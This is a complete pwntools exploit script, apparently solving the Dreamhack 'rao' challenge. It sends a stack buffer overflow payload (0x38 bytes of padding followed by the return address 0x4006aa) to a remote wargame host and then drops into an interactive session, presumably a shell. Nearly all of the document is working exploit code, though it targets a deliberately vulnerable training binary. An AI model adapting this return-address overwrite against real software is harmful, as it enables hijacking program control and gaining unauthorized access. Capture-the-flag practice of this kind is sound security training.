from pwn import *

context.log_level = 'debug'

#p = process('./rao')
p = remote('host3.dreamhack.games',9898)

pay = b''
pay += b'a' * 0x30
pay += b'b' * 0x8
pay += p64(0x4006aa)

print(p.recv())
p.send(pay)

p.interactive()
